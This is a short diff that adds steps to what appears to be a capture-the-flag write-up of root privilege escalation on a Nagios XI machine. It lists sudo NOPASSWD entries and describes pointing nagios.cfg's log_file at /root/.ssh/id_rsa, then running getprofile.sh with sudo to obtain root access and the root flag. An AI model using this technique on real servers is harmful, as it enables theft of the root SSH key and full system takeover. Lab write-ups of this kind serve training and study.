@@ -217,5 +217,14 @@ User nagios may run the following commands on localhost:
     (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
     (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
 
+in the file /usr/local/nagios/etc/nagios.cfg there is line:
+    log_file=/usr/local/nagios/var/nagios.log
 
+so all i have to do is to change the path to:
+    log_file=/root/.ssh/id_rsa
 
+so all that left for me to do is to open a listener and lauch the /usr/local/nagiosxi/scripts/components/getprofile.sh:
+    sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 1
+ and i get the root shell
+ root flag:
+    0c4868046196d718a7548af54c251210
